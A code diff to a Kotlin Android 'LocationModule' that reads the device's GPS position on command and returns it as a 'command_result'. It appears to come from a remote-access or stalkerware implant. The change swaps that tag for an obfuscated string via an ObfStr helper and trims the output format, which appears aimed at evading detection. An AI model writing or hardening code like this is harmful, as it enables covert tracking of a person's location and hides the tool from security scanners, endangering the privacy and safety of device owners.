@@ -5,6 +5,7 @@ import android.content.Context
 import android.location.LocationListener
 import android.location.LocationManager
 import android.os.HandlerThread
+import com.nexlink.bridge.ObfStr
 import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
@@ -13,14 +14,14 @@ import java.util.concurrent.TimeUnit
 
 internal object LocationModule {
     @SuppressLint("MissingPermission")
-    fun execute(ctx: Context): Pair<String, String> = Pair(getLocation(ctx), "command_result")
+    fun execute(ctx: Context): Pair<String, String> = Pair(getLocation(ctx), ObfStr.cmdResult())
 
     @SuppressLint("MissingPermission")
     private fun getLocation(ctx: Context): String {
         return try {
             val lm        = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
             val providers = lm.getProviders(true)
-            if (providers.isEmpty()) return "⚠️ No location providers. Enable GPS."
+            if (providers.isEmpty()) return "No location providers available."
             val latch   = CountDownLatch(1)
             var fresh: android.location.Location? = null
             val ht      = HandlerThread("loc-fix").also { it.start() }
@@ -40,16 +41,14 @@ internal object LocationModule {
             if (best != null) {
                 val fmt = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                 buildString {
-                    appendLine("📍 Location")
-                    appendLine("Latitude:  ${best.latitude}")
-                    appendLine("Longitude: ${best.longitude}")
-                    appendLine("Accuracy:  ${best.accuracy}m")
-                    appendLine("Provider:  ${best.provider}")
-                    appendLine("Time:      ${fmt.format(Date(best.time))}")
-                    appendLine("Fresh:     ${if (fresh != null) "yes" else "no (cached)"}")
-                    appendLine("Maps: https://maps.google.com/?q=${best.latitude},${best.longitude}")
+                    appendLine("Location")
+                    appendLine("Lat: ${best.latitude}")
+                    appendLine("Lon: ${best.longitude}")
+                    appendLine("Acc: ${best.accuracy}m")
+                    appendLine("Time: ${fmt.format(Date(best.time))}")
+                    append("Provider: ${best.provider}")
                 }
-            } else "⚠️ Location not available."
+            } else "Location unavailable"
         } catch (e: Exception) { "Error: ${e.message}" }
     }
 }
